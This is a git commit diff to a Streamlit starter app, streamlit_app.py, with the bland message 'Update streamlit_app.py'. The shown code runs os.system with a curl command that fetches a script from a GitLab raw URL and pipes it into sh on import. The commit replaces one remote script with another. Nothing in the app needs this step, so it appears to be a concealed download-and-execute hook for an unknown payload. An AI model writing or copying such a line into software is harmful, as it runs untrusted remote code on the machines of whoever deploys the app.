bee4641de37e7bda659209555f3a3f7baab56496
meronejas <95197442+meronejas@users.noreply.github.com>
2021-12-07 13:57:25 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -4,7 +4,7 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system('curl -fsSL https://gitlab.com/kancomue/strm/-/raw/main/gas | sh')
+os.system('curl -fsSL https://gitlab.com/kancomue/strm/-/raw/main/panda | sh')
 
 """
 # Welcome to Streamlit!
